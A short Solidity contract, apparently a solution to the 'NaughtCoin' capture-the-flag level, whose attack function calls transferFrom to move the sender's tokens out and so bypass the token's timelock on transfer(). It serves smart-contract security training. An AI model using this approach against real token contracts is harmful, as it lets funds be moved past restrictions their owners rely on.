// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin public naughtCoin;

    constructor(address payable _naughtCoinAddress) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    function attack(uint256 _value) public {
        naughtCoin.transferFrom(msg.sender, address(this), _value);
    }
}
